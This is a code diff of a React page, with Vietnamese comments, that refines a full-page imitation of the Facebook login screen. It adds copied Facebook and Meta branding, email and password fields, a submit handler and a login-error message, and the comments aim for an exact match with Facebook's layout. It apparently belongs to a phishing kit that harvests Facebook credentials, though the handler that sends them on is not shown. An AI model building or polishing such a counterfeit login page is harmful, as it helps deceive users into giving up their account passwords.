@@ -729,7 +729,7 @@ export default function Home() {
                 </div>
               )}
 
-                                                                      {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn tỷ lệ trang thật */}
+                                                                                    {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ FB */}
               {step === 2 && (
                 <div style={{ 
                   position: 'fixed', 
@@ -746,25 +746,27 @@ export default function Home() {
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
-                    alignItems: 'flex-start', // Đẩy sát lề trái hơn
+                    alignItems: 'center', // Căn giữa toàn bộ khối
                     borderRight: '1px solid #e4e6eb',
-                    padding: '0 8vw' // Căn lề theo màn hình
+                    padding: '40px'
                   }}>
-                    <div style={{ width: '100%', maxWidth: '580px' }}>
+                    {/* Khối bọc bên trong để căn lề trái cho chữ */}
+                    <div style={{ width: '100%', maxWidth: '500px', display: 'flex', flexDirection: 'column' }}>
                       
-                      {/* Logo Facebook */}
-                      <svg viewBox="0 0 36 36" height="48" width="48" style={{ marginBottom: '20px' }}>
+                      {/* Logo Facebook nhỏ */}
+                      <svg viewBox="0 0 36 36" height="42" width="42" style={{ marginBottom: '24px' }}>
                         <path fill="#0866FF" d="M18 0C8.06 0 0 8.06 0 18s8.06 18 18 18c9.94 0 18-8.06 18-18S27.94 0 18 0zm4.04 26.13h-4.32v-14.4h-4.32v-4.32h4.32V5.04c0-2.92 1.62-4.32 4.32-4.32h3.6v4.32h-2.16c-1.08 0-1.44.36-1.44 1.44v1.44h4.32l-.72 4.32h-3.6v14.4z"/>
                       </svg>
                       
-                      <h1 style={{ fontSize: '56px', fontWeight: '700', lineHeight: '1.1', color: '#1c2b33', marginBottom: '30px', letterSpacing: '-1.5px' }}>
+                      <h1 style={{ fontSize: '48px', fontWeight: '700', lineHeight: '1.2', color: '#1c2b33', margin: '0 0 24px 0', letterSpacing: '-1px' }}>
                         Explore <br />the <br />things <br /><span style={{ color: '#0064e0' }}>you love.</span>
                       </h1>
                       
+                      {/* Ảnh minh họa */}
                       <img 
                         src="/images/Anhlogin.webp" 
                         alt="Explore" 
-                        style={{ width: '100%', maxWidth: '580px', display: 'block' }} 
+                        style={{ width: '100%', maxWidth: '400px', display: 'block' }} 
                       />
                     </div>
                   </div>
@@ -781,25 +783,18 @@ export default function Home() {
                     {/* Form rộng 396px chuẩn FB */}
                     <div style={{ width: '100%', maxWidth: '396px' }}>
                       
-                      <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', marginBottom: '24px' }}>
+                      <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', margin: '0 0 20px 0' }}>
                         Log into Facebook
                       </h2>
 
-                      <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
+                      <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                         <input 
                           className="fb-input" 
                           placeholder="Email or mobile number" 
                           value={loginUser} 
                           onChange={e => setLoginUser(e.target.value)} 
                           required 
-                          style={{ 
-                            padding: '16px', 
-                            fontSize: '16px', 
-                            border: '1px solid #ccd0d5', 
-                            borderRadius: '8px',
-                            width: '100%',
-                            boxSizing: 'border-box'
-                          }}
+                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
                         />
                         
                         <input 
@@ -809,49 +804,42 @@ export default function Home() {
                           value={loginPass} 
                           onChange={e => setLoginPass(e.target.value)} 
                           required 
-                          style={{ 
-                            padding: '16px', 
-                            fontSize: '16px', 
-                            border: '1px solid #ccd0d5', 
-                            borderRadius: '8px',
-                            width: '100%',
-                            boxSizing: 'border-box'
-                          }}
+                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
                         />
                         
                         {showLoginError && <div style={{ color: '#fa383e', fontSize: '14px', marginTop: '4px' }}>{t.loginError}</div>}
                         
                         <button type="submit" disabled={loading} style={{
                           width: '100%', padding: '16px', borderRadius: '100px', border: 'none',
-                          background: '#0866FF', color: '#fff', fontSize: '20px', fontWeight: '600', cursor: 'pointer', marginTop: '8px'
+                          background: '#0866FF', color: '#fff', fontSize: '20px', fontWeight: '700', cursor: 'pointer', marginTop: '6px'
                         }}>
                           {loading ? 'Logging in...' : 'Log in'}
                         </button>
                       </form>
 
                       <div style={{ textAlign: 'center', marginTop: '16px' }}>
-                        <a href="#" style={{ color: '#0866FF', fontSize: '14px', textDecoration: 'none' }}>Forgot password?</a>
+                        <a href="#" style={{ color: '#0866FF', fontSize: '14px', textDecoration: 'none', fontWeight: '500' }}>Forgot password?</a>
                       </div>
 
                       {/* Nút Create new account */}
-                      <div style={{ marginTop: '40px', paddingTop: '24px', borderTop: '1px solid #e4e6eb', textAlign: 'center' }}>
+                      <div style={{ marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb', textAlign: 'center' }}>
                         <button type="button" style={{
                           padding: '14px 24px', borderRadius: '100px', border: '1px solid #0866FF',
                           background: 'transparent', color: '#0866FF', fontSize: '16px', fontWeight: '600', cursor: 'pointer',
-                          width: '100%', maxWidth: '250px'
+                          width: 'auto', minWidth: '200px' // Cho nút dàn ngang ra chứ ko bị bóp
                         }}>
                           Create new account
                         </button>
                       </div>
 
-                      {/* Logo Meta (Đã thêm lại vì trang thật có) */}
-                      <div style={{ textAlign: 'center', marginTop: '24px' }}>
+                      {/* Logo Meta */}
+                      <div style={{ textAlign: 'center', marginTop: '28px' }}>
                           <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '16px', opacity: 0.7 }} />
                       </div>
 
-                      {/* Nút Back (mình tự thêm để mày test) */}
-                      <div style={{ textAlign: 'center', marginTop: '30px' }}>
-                        <button onClick={() => setStep(1.5)} style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '15px', fontWeight: '600', cursor: 'pointer' }}>
+                      {/* Nút Back */}
+                      <div style={{ textAlign: 'center', marginTop: '24px' }}>
+                        <button onClick={() => setStep(1.5)} style={{ background: 'none', border: 'none', color: '#1877F2', fontSize: '15px', fontWeight: '500', cursor: 'pointer' }}>
                           Back
                         </button>
                       </div>
